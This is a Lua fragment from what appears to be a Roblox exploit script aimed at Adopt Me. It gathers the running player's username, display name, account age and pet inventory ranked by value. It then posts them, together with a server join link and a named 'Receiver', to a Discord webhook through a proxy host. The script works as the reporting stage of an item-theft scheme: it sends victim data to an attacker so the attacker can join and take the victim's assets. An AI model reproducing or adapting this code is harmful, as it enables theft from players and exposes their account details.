-- [[ 1. THE WORKING PROXY HANDLER ]] --
local function post(url, payload)
    local request = (syn and syn.request) or (http and http.request) or http_request or request
    if not request then return end

    -- Use the Lewisakura proxy which gave us the 204 success
    local proxyUrl = url:gsub("discord.com", "webhook.lewisakura.moe")
    
    pcall(function()
        request({
            Url = proxyUrl,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode(payload)
        })
    end)
end

-- [[ 2. EMBED DESIGNER ]] --
local function sendReport(url, title, color, pets, val, targetName)
    -- REQUIREMENT: Sort Highest to Lowest
    table.sort(pets, function(a, b) return a.val > b.val end)

    local lootLines = ""
    for i, p in ipairs(pets) do
        if i > 25 then break end
        local prefix = (p.mega and "🌈 ") or (p.neon and "✨ ") or "🐾 "
        lootLines = lootLines .. prefix .. p.name .. " — `" .. p.val .. "`\n"
    end

    local payload = {
        username = "Mondeur Elite",
        embeds = {{
            title = title,
            color = color,
            description = "### 📄 Player Information\n" ..
                "👤 **User Name** : `" .. LocalPlayer.Name .. "`\n" ..
                "🎭 **Display Name** : `" .. LocalPlayer.DisplayName .. "`\n" ..
                "📅 **Account Age** : " .. LocalPlayer.AccountAge .. " days\n" ..
                "📱 **Executor** : Delta\n" ..
                "😎 **Receiver** : " .. (targetName or "None Online") .. "\n" ..
                "💰 **Total Value** : `" .. val .. "`\n\n" ..
                "### 📡 Player Status\n" ..
                "🟢 **Status**: `Connected & Active`\n\n" ..
                "### 📦 Loot Summary\n" ..
                "```\n" .. (lootLines ~= "" and lootLines or "Empty") .. "```\n" ..
                "**Total Items Found:** `" .. #pets .. "`\n\n" ..
                "### 👥 Join Player\n" ..
                "[**Join Server Instance (Mobile)**](roblox://placeID=920587237&gameInstanceId=" .. game.JobId .. ")",
            footer = { text = "Mondeur Elite Services | " .. os.date("%X") },
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }}
    }
    post(url, payload)
end

